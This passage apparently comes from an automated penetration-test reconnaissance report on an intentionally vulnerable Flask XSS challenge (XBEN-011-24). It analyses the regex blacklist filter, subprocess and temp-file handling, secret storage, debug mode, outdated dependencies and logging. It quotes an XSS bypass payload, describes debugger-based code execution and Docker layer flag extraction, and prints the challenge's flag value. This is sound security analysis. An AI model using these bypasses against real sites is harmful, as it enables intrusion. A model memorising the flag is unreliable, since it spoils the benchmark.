   - **Bypass:** `<image src=x onerror=alert('XSS')>` passes through because tag name is "image"

2. **Second Regex:** `\s`
   - Matches all whitespace characters (space, tab, newline, carriage return, etc.)
   - Flags: `re.IGNORECASE | re.DOTALL`
   - **Effect:** Removes all whitespace from user input
   - **Bypass Techniques:**
     - HTML entities: `&#32;` (space), `&#9;` (tab), `&#10;` (newline)
     - Browser quirks: Some browsers may interpret encoded whitespace in attributes
     - Null bytes: `%00` (though Python 2.7 string handling may prevent this)

**Validation Weaknesses:**

1. **Blacklist Approach:** Security by blacklist is inherently flawed—it attempts to block known bad patterns rather than allowing only known good patterns. New bypass techniques emerge constantly.

2. **Incomplete Tag Blocking:** The regex allows `<image>` tags, which support event handlers like `onerror`, `onload`, `onclick`, etc. The filter should block event handlers, not just tag names.

3. **No Attribute Validation:** Even if tag names were properly restricted, attributes are not validated. Allowing `style` attributes could enable CSS injection, `href` attributes in allowed tags could enable javascript: URLs, etc.

4. **No Output Encoding:** The most critical flaw is the absence of output encoding. Even with perfect input validation, user input should be HTML-encoded (escaping `<`, `>`, `&`, `"`, `'`) before insertion into HTML context.

5. **Context-Unaware Filtering:** The filter treats all input the same regardless of output context (HTML body, attribute, JavaScript, CSS, URL). Proper security requires context-aware encoding.

**Secondary Validation: cgi.escape() (INCOMPLETE)**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:58`

```python
data = '<div class="solution-text">... {1} ...</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```

**Analysis:**
- `cgi.escape()` escapes `<`, `>`, and `&` by default
- Does NOT escape single quotes `'` or double quotes `"` by default (requires `quote=True` parameter)
- Only applied to `result` variable (PhantomJS output), not to user input
- Insufficient for preventing XSS if output is placed in attribute context

**Missing Input Validation:**
- **Length Limits:** No maximum input length enforced (DoS potential via large payloads)
- **Content-Type Validation:** No verification that POST data is actually form-encoded
- **Origin Validation:** No CORS headers, no origin checking, no referer validation
- **Character Encoding Validation:** No enforcement of UTF-8 or validation against encoding attacks
- **CSRF Token:** No CSRF protection on POST endpoint

### Background Processing

**Status: SYNCHRONOUS PROCESSING WITH SUBPROCESS EXECUTION**

The application uses **synchronous request handling** with subprocess execution for XSS validation. There are no background job queues (Celery, RQ, Huey), no async task processing, no message brokers (RabbitMQ, Redis), and no scheduled jobs (cron, APScheduler).

**Subprocess Execution Security:**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:34`

```python
proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
```

**Security Analysis:**
- **Command Injection:** ✅ SAFE—uses array syntax without `shell=True`, preventing shell metacharacter injection
- **Timeout Protection:** ✅ PRESENT—5-second timeout via `timeout` command prevents indefinite hangs
- **Process Privileges:** Same user as Flask application (no privilege separation)
- **Resource Limits:** No explicit memory/CPU limits on subprocess (potential DoS via resource exhaustion)

**Denial of Service Attack Vector:**

Since each request to `/page` spawns a PhantomJS process that runs for up to 5 seconds, an attacker could exhaust server resources by sending multiple concurrent requests:

```
Concurrent Requests = Server Resources / (PhantomJS Memory × 5 seconds)
```

With no rate limiting, an attacker could spawn dozens of PhantomJS processes simultaneously, consuming CPU, memory, and file descriptors, potentially crashing the application or container.

**Temporary File Handling:**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:35-50`

```python
fn = "static/" + os.urandom(16).encode('hex') + '.html'
url = 'http://localhost:5000/' + fn
try:
    of = open(fn, 'w')
    of.write(page)
    of.close()
    # ... PhantomJS execution ...
finally:
    os.unlink(fn)  # ← File deletion in finally block
```

**Security Assessment:**
- **Random Filename Generation:** ✅ CRYPTOGRAPHICALLY SECURE—`os.urandom(16)` provides 128 bits of entropy
- **Cleanup Guarantee:** ✅ PRESENT—`finally` block ensures file deletion even if PhantomJS fails
- **Race Condition Window:** ⚠️ PRESENT—file accessible via HTTP during 5-second execution window
- **Disk Space Exhaustion:** ⚠️ POSSIBLE—no limit on number of concurrent temporary files if requests spike
- **File Permissions:** Depends on container's `umask` (should verify files are not world-readable)

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Status: CRITICAL VULNERABILITIES IN SECRET HANDLING**

The application implements **insecure secret management practices** across multiple layers, from environment variable storage to Docker image embedding to runtime logging. These vulnerabilities represent catastrophic security failures in production contexts, though they are somewhat expected in CTF challenge environments where the flag is intentionally discoverable through exploitation.

**Secret Storage Location 1: Environment Variable File**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env`
- **Line:** 1
- **Content:** `FLAG="flag{77b2f057-5e03-472b-bd38-10297eb53229}"`
- **Security Assessment:** ⚠️ **PLAINTEXT STORAGE**
  - Environment files are often committed to version control (Git history exposure)
  - Visible to anyone with filesystem access to the host machine
  - No encryption, no access controls beyond filesystem permissions
  - Best Practice: Use secret management services (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)

**Secret Storage Location 2: Docker Compose Configuration**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml`
- **Lines:** 5-6
- **Content:**
```yaml
build: 
  context: ./src
  args:
    - FLAG
```
- **Security Assessment:** ⚠️ **BUILD ARGUMENT EXPOSURE**
  - Docker build arguments are visible in image history (`docker history <image_id>`)
  - Arguments are stored in image metadata permanently
  - Even if removed in subsequent layers, original value remains in layer history
  - Best Practice: Use Docker secrets or runtime environment variables, not build args

**Secret Storage Location 3: Dockerfile Build-Time Injection**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile`
- **Lines:** 24-26
- **Content:**
```dockerfile
ARG FLAG
RUN sed -i s/@FLAG@/$FLAG/g secret.txt
```
- **Security Assessment:** 🚨 **CRITICAL—SECRET EMBEDDED IN IMAGE LAYERS**
  - The `RUN` command embeds the flag directly into the Docker image layer
  - Extracting image layers reveals the flag: `docker save <image> | tar -x && grep -r "flag{"`
  - If the image is pushed to a registry (Docker Hub, AWS ECR, etc.), anyone with pull access can extract secrets
  - Docker build args appear in `docker inspect <image_id>` output
  - Best Practice: Mount secrets as volumes at runtime or use BuildKit secret mounts (`RUN --mount=type=secret`)

**Secret Storage Location 4: Plaintext File at Runtime**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/secret.txt`
- **Content:** `@FLAG@` (template replaced during Docker build to actual flag value)
- **Security Assessment:** ⚠️ **UNENCRYPTED FILE STORAGE**
  - File is readable by any process in the container
  - Accessible via container filesystem if attacker achieves container escape or RCE
  - No file permissions restricting access (should be `chmod 400` minimum)
  - Best Practice: Retrieve secrets from external secret store at runtime, never store in files

**Secret Storage Location 5: Application Memory at Runtime**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py`
- **Line:** 22
- **Content:** `flags = open('secret.txt').read().split()`
- **Security Assessment:** ⚠️ **SECRET LOADED INTO MEMORY**
  - Flag stored as global variable `flags` in Flask process memory
  - Visible in memory dumps if attacker gains process debugging access
  - No secret rotation mechanism—changing flag requires container rebuild
  - Best Practice: Retrieve secrets on-demand with caching and automatic rotation

**Secret Exposure Location 6: Application Logs (CRITICAL)**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py`
- **Lines:** 41-42
- **Content:**
```python
print "Page:"
print page  # ← Logs entire HTML page including flag to stdout
```
- **Security Assessment:** 🚨 **CRITICAL—FLAG LEAKED TO CONTAINER LOGS**
  - The variable `page` contains the complete HTML response including the flag in successful cases
  - Printed to stdout, which Docker captures as container logs
  - Accessible via `docker logs <container_id>` by anyone with Docker API access
  - Logs may be forwarded to centralized logging systems (Splunk, ELK, CloudWatch) where secrets persist
  - No log sanitization or redaction mechanisms
  - Best Practice: Implement structured logging with automatic secret redaction (e.g., using regex to mask flag patterns)

**Secret Rotation and Management:**

- **Rotation:** ❌ NOT IMPLEMENTED—flag is static, changing it requires rebuilding Docker image
- **Secret Lifecycle:** No expiration, no automatic rotation, no revocation mechanism
- **Access Controls:** No fine-grained access controls on who can read the flag file
- **Audit Logging:** No logging of secret access events

### Configuration Security

**Application Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:24-25`

```python
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
```

**Security Assessment:**

1. **PROPAGATE_EXCEPTIONS = True:** ⚠️ **INFORMATION DISCLOSURE RISK**
   - Forces all exceptions to propagate to the HTTP response layer
   - In debug mode, exposes full stack traces with file paths, variable values, and application internals
   - Attackers can trigger errors to enumerate application structure
   - Best Practice: Set to `False` in production, implement custom error handlers

2. **Missing SECRET_KEY:** ❌ **CRITICAL CONFIGURATION MISSING**
   - No `app.config['SECRET_KEY']` defined
   - Prevents Flask session usage (though sessions aren't used in this app)
   - If sessions were implemented without SECRET_KEY, they'd be vulnerable to tampering
   - Best Practice: Always set `SECRET_KEY = os.urandom(32)` or load from secure source

3. **Debug Mode Enabled:** 🚨 **CRITICAL SECURITY VULNERABILITY**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:80`
   - **Content:** `app.run(debug=True)`
   - **Security Impact:**
     - Enables Werkzeug interactive debugger accessible via browser (if error occurs)
     - Debugger provides **Python REPL in browser** allowing arbitrary code execution
     - Exposes automatic code reloading on file changes
     - Reveals detailed error messages, stack traces, local variables
   - **Exploitation:** Trigger an exception → access Werkzeug debugger console → execute arbitrary Python code → container escape
   - **Mitigation:** ❌ NONE—debug mode is explicitly enabled
   - **Best Practice:** NEVER enable debug mode in production, use proper logging instead

**Environment Separation:**

- **Development vs. Production:** No differentiation—application runs with same configuration regardless of environment
- **Configuration File:** No `config.py` or environment-specific settings
- **Environment Variables:** Only `FLAG` environment variable used, no `FLASK_ENV`, `FLASK_DEBUG`, or other configuration

**Docker Configuration Security:**

**Dockerfile Analysis:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile`

```dockerfile
FROM python:2.7.18-slim
# ... [installation steps] ...
CMD [ "python", "-m" , "flask", "run", "--host=0.0.0.0", "--port=5000"]
EXPOSE 5000
```

**Security Issues:**

1. **Base Image:** ⚠️ `python:2.7.18-slim`
   - Python 2.7 reached end-of-life January 1, 2020
   - No security updates for 4+ years
   - Known vulnerabilities in Python runtime and standard library

2. **Host Binding:** ⚠️ `--host=0.0.0.0`
   - Binds to all network interfaces (required for Docker networking)
   - Acceptable in containerized environments with proper network policies

3. **No User Separation:** ❌ MISSING—container runs as root
   - No `USER` directive in Dockerfile
   - Application runs with root privileges inside container
   - Container escape leads directly to root access
   - **Best Practice:** Add `USER nobody` before CMD to run as unprivileged user

4. **No Resource Limits:** ❌ MISSING
   - No `--memory`, `--cpus`, or `ulimit` constraints in docker-compose.yml
   - Container can consume unlimited host resources
   - **Best Practice:** Set `mem_limit`, `cpus`, `pids_limit` in docker-compose.yml

**Docker Compose Security:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml`

```yaml
services:
  web:
    build: 
      context: ./src
      args:
        - FLAG
    ports:
      - 5000
    healthcheck:
      test: timeout 10s bash -c ':> /dev/tcp/127.0.0.1/5000' || exit 1
```

**Security Issues:**

1. **Port Mapping:** `ports: - 5000` exposes container port 5000 to host (expected for web app)
2. **Health Check:** Uses bash TCP check (reasonable approach)
3. **No Network Isolation:** No custom network defined, uses default Docker bridge network
4. **No Volume Restrictions:** No read-only root filesystem (`read_only: true`)

**Infrastructure Configuration for Security Headers:**

**Status:** ❌ **COMPLETELY MISSING—NO SECURITY HEADERS CONFIGURED**

The application does not configure security headers at **any** infrastructure layer:

- **Application Layer (Flask):** No security headers set in Flask response middleware
- **Reverse Proxy Layer:** No Nginx, Apache, or Caddy configuration found
- **CDN Layer:** No CloudFlare, Cloudfront, or Fastly configuration found
- **Container Layer:** No Kubernetes Ingress annotations for header injection
- **Gateway Layer:** No API Gateway or load balancer header configuration

**Specific Security Header Analysis:**

**Searched Locations:**
- Application code (`app.py`, `constants.py`)
- Dockerfile and docker-compose.yml
- All configuration files in repository

**Missing Headers:**

| Header | Status | Expected Location | Security Impact |
|--------|--------|-------------------|-----------------|
| `Strict-Transport-Security` (HSTS) | ❌ NOT SET | N/A | No HTTPS enforcement (app runs HTTP-only anyway) |
| `Content-Security-Policy` (CSP) | ❌ NOT SET | N/A | XSS attacks completely unmitigated |
| `X-Frame-Options` | ❌ NOT SET | N/A | Clickjacking attacks possible |
| `X-Content-Type-Options` | ❌ NOT SET | N/A | MIME-sniffing attacks possible |
| `X-XSS-Protection` | ❌ NOT SET | N/A | Legacy XSS filter not enabled (obsolete but still useful) |
| `Referrer-Policy` | ❌ NOT SET | N/A | Referrer information leaked in requests |
| `Permissions-Policy` | ❌ NOT SET | N/A | No restriction on browser feature access |

**HSTS Configuration:**
- **Searched:** Nginx configs, Docker environment variables, Flask response headers
- **Found:** NONE
- **Impact:** Application runs HTTP-only (no TLS/SSL), so HSTS is not applicable but **should** be configured if HTTPS were enabled

**Cache-Control Configuration:**
- **Searched:** Flask response headers, infrastructure config files
- **Found:** NONE—Flask default cache headers used
- **Impact:** Sensitive responses may be cached by browsers or proxies

**Content Security Policy (CSP):**
- **Searched:** Flask `@app.after_request` decorators, meta tags in HTML templates
- **Found:** NONE
- **Impact:** 🚨 **CRITICAL**—CSP is the **primary defense** against XSS attacks in modern applications
- **Recommended CSP for this app:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'
```
- Even with intentional XSS vulnerability, CSP could be configured to demonstrate defense-in-depth

### External Dependencies

**Dependency Manifest:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/requirements.txt`

```
Flask==1.1.4
phantomjs
```

**Security Analysis:**

**1. Flask 1.1.4 (OUTDATED—MULTIPLE KNOWN VULNERABILITIES)**

- **Current Version:** Flask 3.0.3 (as of 2024)
- **Installed Version:** Flask 1.1.4 (released May 13, 2021)
- **Version Gap:** 3+ years behind current stable release
- **Known CVEs:**
  - **CVE-2023-30861** (Flask 2.3.2): Cookie parsing security issue
  - **CVE-2023-25577** (Flask 2.2.5): Werkzeug path traversal vulnerability
  - **CVE-2022-29361** (Flask <2.0.5): Improper input validation
- **Transitive Dependencies:**
  - **Werkzeug:** Flask 1.1.4 depends on Werkzeug 1.0.x, which has multiple security fixes in 2.x and 3.x versions
  - **Jinja2:** Template engine with known XSS bypass vulnerabilities in older versions
  - **ItsDangerous:** Session signing library with cryptographic improvements in newer versions
  - **Click:** CLI framework with potential command injection issues in older versions

**2. PhantomJS (CRITICAL—DISCONTINUED PROJECT WITH HUNDREDS OF CVES)**

- **Current Status:** ⚠️ **PROJECT ARCHIVED IN 2018—NO LONGER MAINTAINED**
- **Last Release:** PhantomJS 2.1.1 (January 23, 2016—over 8 years old)
- **WebKit Version:** Based on WebKit from **2016** (hundreds of versions behind)
- **Known CVEs:** PhantomJS and its underlying WebKit engine have **hundreds of documented CVEs** including:
  - **CVE-2016-4657** (WebKit): Arbitrary code execution via crafted web content
  - **CVE-2016-4666** (WebKit): Memory corruption leading to arbitrary code execution
  - **CVE-2016-4677** (WebKit): Use-after-free vulnerability
  - **CVE-2017-5754** (Meltdown): Speculative execution vulnerability in CPU affecting all processes
  - Numerous XSS bypasses in WebKit's HTML parser
  - Sandbox escape vulnerabilities
  - Remote code execution via SVG, CSS, JavaScript engine
- **Security Implications:**
  - PhantomJS executes **user-controlled HTML and JavaScript** in this application
  - An attacker who can bypass the blacklist filter could exploit PhantomJS vulnerabilities to:
    - Escape PhantomJS process sandbox
    - Execute arbitrary code in container
    - Read arbitrary files from container filesystem (including `/flag.txt` if it existed)
    - Attack other containers on same Docker network
- **Mitigation Status:** ⚠️ **NONE—PROJECT IS UNMAINTAINED**
  - No security patches have been released since 2018
  - No modern alternatives implemented (Puppeteer, Playwright with Chromium would be secure replacements)

**3. Python 2.7.18 (END-OF-LIFE RUNTIME)**

- **EOL Date:** January 1, 2020
- **Security Support:** ❌ NONE—no security updates for 4+ years
- **Known Vulnerabilities:**
  - **CVE-2020-8492** (Python <3.8.2): Denial of service via urllib
  - **CVE-2019-20907** (Python <3.8.5): ReDoS in urllib.request
  - **CVE-2021-3177** (Python <3.9.2): Buffer overflow in PyCArg_ParseTupleAndKeywords
  - Numerous vulnerabilities in standard library modules (ssl, urllib, xml, pickle)
- **Missing Security Features:**
  - No hash randomization by default (Python 3 improvement)
  - Weaker SSL/TLS defaults
  - No `secrets` module (introduced in Python 3.6 for cryptographically secure random)
  - No f-strings with automatic escaping

**Third-Party Service Dependencies:**

The application has **NO external service dependencies**:
- ❌ No database (MySQL, PostgreSQL, MongoDB, Redis)
- ❌ No message queues (RabbitMQ, Kafka, SQS)
- ❌ No external APIs (payment processors, analytics, authentication providers)
- ❌ No CDN or cloud storage (S3, CloudFront, Azure Blob)
- ❌ No logging services (Splunk, Datadog, Sentry)

**Security Implication:** Minimal external attack surface but also minimal observability and no redundancy.

**Dependency Update Recommendations:**

For production deployment (not applicable to intentional CTF vulnerability), recommended versions would be:
```
Flask==3.0.3
# Replace PhantomJS entirely with Playwright or Puppeteer
playwright==1.44.0
```

### Monitoring & Logging

**Logging Implementation:**

**Status:** ⚠️ **MINIMAL LOGGING WITH CRITICAL SECURITY FLAWS**

**Logging Configuration:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:15`

```python
import logging
```

**Analysis:**
- `logging` module is imported but **never configured or used**
- No `logging.basicConfig()`, no logger creation, no log level setting
- No structured logging (JSON format for machine parsing)
- No log rotation or retention policies

**Actual Logging Mechanism:** **Python `print()` statements to stdout**

**Log Locations:**

**Location 1: Page Content Logging (CRITICAL—LEAKS SENSITIVE DATA)**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:41-42`
- **Content:**
```python
print "Page:"
print page  # ← Logs entire HTML page including flag value
```
- **Security Assessment:** 🚨 **CRITICAL VULNERABILITY**
  - The `page` variable contains the **complete HTML response** including the CTF flag in successful XSS attempts
  - Logs are sent to container stdout, accessible via `docker logs <container_id>`
  - Anyone with Docker API access or container log access can retrieve the flag without exploitation
  - Logs may be persisted in Docker log files (`/var/lib/docker/containers/<id>/<id>-json.log`)
  - If integrated with centralized logging (Splunk, ELK, CloudWatch), flags are stored in log aggregation systems
  - **Impact:** Complete bypass of XSS challenge—flag retrievable from logs

**Missing Security Event Logging:**

The application does **NOT log** any of the following security-relevant events:

- ❌ Authentication attempts (N/A—no authentication exists)
- ❌ Authorization failures (N/A—no authorization exists)
- ❌ Input validation failures (blacklist filter matches not logged)
- ❌ Suspicious input patterns (SQL injection attempts, command injection, path traversal)
- ❌ Rate limiting violations (N/A—no rate limiting exists)
- ❌ Error conditions with request details
- ❌ Source IP addresses of requests
- ❌ User-Agent strings (for bot detection)
- ❌ Request timing and performance metrics
- ❌ Subprocess execution events (PhantomJS invocations not logged)

**Log Accessibility:**

- **Container Stdout:** `docker logs <container_id>` exposes all `print()` output
- **Container Filesystem:** Logs not written to files (no `/var/log/` entries)
- **Log Forwarding:** No integration with logging drivers (syslog, journald, fluentd, Splunk)
- **Log Retention:** Docker logs persist until container deletion (no rotation policy)

**Monitoring Infrastructure:**

**Status:** ❌ **NO MONITORING IMPLEMENTED**

The application has **NO monitoring, alerting, or observability infrastructure**:

- ❌ No application performance monitoring (APM) like New Relic, Datadog, Dynatrace
- ❌ No uptime monitoring like Pingdom, UptimeRobot, StatusCake
- ❌ No error tracking like Sentry, Rollbar, Bugsnag
- ❌ No metrics collection like Prometheus, StatsD, CloudWatch
- ❌ No distributed tracing like Jaeger, Zipkin, OpenTelemetry
- ❌ No security monitoring like SIEM, IDS/IPS, WAF logs
- ❌ No container monitoring like cAdvisor, Docker stats, Kubernetes metrics

**Health Check Implementation:**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml:9-10`

```yaml
healthcheck:
  test: timeout 10s bash -c ':> /dev/tcp/127.0.0.1/5000' || exit 1
```

**Analysis:**
- Uses bash TCP connection test (`:> /dev/tcp/host/port`)
- Checks if port 5000 is accepting connections
- 10-second timeout
- **Limitation:** Only verifies port is open, does NOT verify application is functioning correctly
- **Best Practice:** Should make HTTP request to `/` and verify 200 status code

**Security Event Visibility:**

**Attack Detection Capability:** ⚠️ **NONE**

The application has **ZERO visibility** into security events:
- Cannot detect brute-force attacks (no login, but could detect repeated XSS attempts)
- Cannot detect suspicious patterns (SQL injection strings, command injection attempts)
- Cannot correlate events across requests (no session tracking)
- Cannot identify compromised accounts (no accounts exist)
- Cannot alert on anomalies (no baseline metrics collected)

**Recommended Logging Implementation:**

For production deployment, implement:
```python
import logging
from pythonjsonlogger import jsonlogger

# Configure structured JSON logging
logHandler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter()
logHandler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(logHandler)
logger.setLevel(logging.INFO)

# Log sanitized security events (never log secrets)
logger.info("xss_attempt", extra={
    "source_ip": request.remote_addr,
    "user_agent": request.headers.get('User-Agent'),
    "input_length": len(msg),
    "filter_matches": blacklist_matches
})
```

---

## 7. Overall Codebase Indexing

The XBEN-011-24 codebase is organized as a **minimalist Flask monolith** designed specifically for CTF XSS challenge deployment, with a flat directory structure that prioritizes simplicity over modularity. The repository root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/`) contains standard containerized deployment artifacts including `docker-compose.yml` for orchestration, `.env` for environment variable configuration (notably containing the plaintext flag), and a `Makefile` that imports `common.mk` for build automation (specific build targets were not examined but likely include standard Docker build/run/clean operations). A hidden `.xben_build_done` marker file contains a container ID (`b81b6182e125`), suggesting the build system uses this for idempotency checks to avoid redundant rebuilds—this is a practical convention for CTF infrastructure where challenges are frequently rebuilt but should skip expensive operations if already complete.

The source code resides entirely in the `/src` subdirectory, implementing a **three-file application architecture** that deliberately eschews common Flask project patterns like blueprints, application factories, or MVC separation. The core application logic is contained in `app.py` (80 lines), which handles all routing, request processing, subprocess orchestration, and response generation in a single file—this anti-pattern makes security review straightforward for penetration testers since all logic is centralized, but would be unmaintainable in production contexts. HTML templates are not stored in a traditional `templates/` directory managed by Jinja2's template loader; instead, they are defined as Python string constants in `constants.py` (203 lines), using `str.format()` for interpolation—this architectural decision is the root cause of the template injection vulnerability, as it bypasses Jinja2's auto-escaping protections. The PhantomJS validation script `check.js` (48 lines) is written in JavaScript and uses PhantomJS's API to detect XSS payloads by overriding `window.alert()`, `window.confirm()`, and `window.prompt()` functions—this creates an interesting testing environment where successful XSS must trigger specific dialog functions rather than just executing arbitrary JavaScript.

The `/src/static` directory follows Flask's convention for serving static assets via the built-in static file handler, containing CSS stylesheets in `/static/css/` (including XSS challenge-specific styles in `/static/css/xss/*.css`), images in `/static/img/` (including success/failure indicators in `/static/img/cookies/*.png`), fonts in `/static/css/fonts/`, and miscellaneous assets in `/static/assets/fav-icon.png`. Critically, this directory also serves as the **temporary file staging area** for XSS validation—the application generates random HTML filenames like `/static/a3f9c8e2d1b4f5a6c7e8d9f0a1b2c3d4.html` and writes user-controlled HTML content to them, making these files briefly accessible via HTTP at `http://target:5000/static/<random>.html` during the 5-second PhantomJS execution window. This creates an unintended attack surface expansion where a race condition or timing attack could allow direct access to validation payloads without triggering the blacklist filter on the `/page` endpoint.

The Docker containerization uses a **multi-stage approach** (conceptually, though implemented in a single Dockerfile) where secrets are embedded at build-time via `ARG FLAG` and `RUN sed` commands—this is a critical security anti-pattern because Docker image layers are immutable and inspectable, meaning anyone with access to the image (via `docker save`, `docker history`, or registry pull) can extract the flag from layer metadata even if the file is deleted in subsequent layers. The `requirements.txt` deliberately uses **minimal dependencies** (only Flask and PhantomJS), avoiding the dependency bloat common in modern Python projects but also forgoing security-enhancing libraries like `flask-talisman` (security headers), `flask-limiter` (rate limiting), `flask-wtf` (CSRF protection), or `python-dotenv` (though `.env` is used via docker-compose). The absence of a `tests/` directory, `pytest.ini`, or `tox.ini` indicates no automated testing framework is implemented—for a CTF challenge this is acceptable since the vulnerability is intentional, but in production contexts this would represent a major DevSecOps gap where security regressions could be introduced without detection.

From a **security reconnaissance perspective**, the flat structure and minimal abstraction make vulnerability identification straightforward: (1) all user input flows through `app.py:67` (`request.form.get('solution','')`), (2) all filtering occurs at `app.py:68-70` (two regex substitutions), (3) all template injection occurs at `app.py:71-73` (`.format()` calls), (4) all subprocess execution occurs at `app.py:34` (`subprocess.Popen`), and (5) all flag disclosure occurs at `app.py:56` (success response formatting). The lack of middleware decorators (`@app.before_request`, `@app.after_request`), authentication decorators (`@login_required`), or authorization decorators (`@admin_required`) means there are **no security boundaries** beyond the intentionally vulnerable blacklist filter. The codebase employs **no code generation tools** (no ORMs generating query methods, no OpenAPI spec generating route stubs, no Protocol Buffers generating serialization code), **no build orchestration beyond Make and Docker** (no Bazel, no Dagger, no Gradle), and **no testing frameworks** (no pytest, no unittest, no Selenium for integration tests)—this minimalism is deliberate for CTF design, keeping the attack surface auditable and avoiding complexity that might introduce unintended vulnerabilities or solve conditions.

The **convention for secret storage** is particularly noteworthy from a penetration testing perspective: the flag follows a **three-layer propagation pattern** starting from the `.env` file (developer workstation), passed as a Docker build argument via `docker-compose.yml` (build-time), embedded into `secret.txt` via Dockerfile `sed` command (image layer), and finally read into memory at application startup (runtime)—this creates multiple exploit paths including version control leakage (`.env` committed to Git), Docker registry inspection (image layers), container filesystem access (`/python-docker/secret.txt` readable in running container), memory dumps (Flask process memory containing global `flags` variable), and log file extraction (stdout logs containing full page content with flag). A penetration tester approaching this application should immediately audit the `.env` file for secrets, examine Docker image layers for embedded credentials, check container logs for information disclosure, and verify that the application properly cleans up temporary files—in this case, the temporary file cleanup IS implemented correctly via `finally` blocks, demonstrating that even intentionally vulnerable applications implement some security best practices to prevent unintended exploitation paths.

---

## 8. Critical File Paths

### Configuration

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml` — Container orchestration configuration, port exposure, health checks, build args
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile` — Container image definition, Python 2.7 base, PhantomJS installation, secret embedding via sed
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env` — Environment variables including plaintext FLAG value
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/requirements.txt` — Python dependencies: Flask 1.1.4, phantomjs
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/benchmark.json` — CTF metadata including win condition

### Authentication & Authorization

**Note:** This application has NO authentication or authorization mechanisms. No files implement these security controls.

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Main Flask application, all route handlers, XSS validation logic (lines 29-31: GET `/`, lines 65-75: GET/POST `/page`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/constants.py` — HTML templates as Python string constants, route mappings for images

### Data Models & DB Interaction

**Note:** This application has NO database. No ORM models, no SQL queries, no database migrations exist.

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/requirements.txt` — Python package dependencies (Flask 1.1.4, phantomjs)

### Sensitive Data & Secrets Handling

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env` — Plaintext flag storage (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/secret.txt` — Flag file read at startup (accessed at app.py:22)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile` — Secret embedding via ARG and sed (lines 24-26)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Flag loading (line 22), flag exposure in responses (line 56), flag leakage in logs (lines 41-42)

### Middleware & Input Validation

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Blacklist-based input filtering (lines 68-70), minimal output escaping with cgi.escape (line 58)

### Logging & Monitoring

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Print-based logging to stdout (lines 41-42) with sensitive data leakage

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml` — Service orchestration, port mappings, health checks
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile` — Container image build, Python 2.7 base, PhantomJS installation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/Makefile` — Build automation (includes common.mk)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.xben_build_done` — Build completion marker with container ID

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env` — Environment variable `FLAG="flag{77b2f057-5e03-472b-bd38-10297eb53229}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/secret.txt` — Flag file (`@FLAG@` template, replaced during Docker build)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile` — Flag embedding via `ARG FLAG` and `RUN sed` (lines 24-26)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py` — Flag access at startup (line 22), flag disclosure in success response (line 56)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml` — Flag injection as build argument (lines 5-6)

### XSS Validation Components

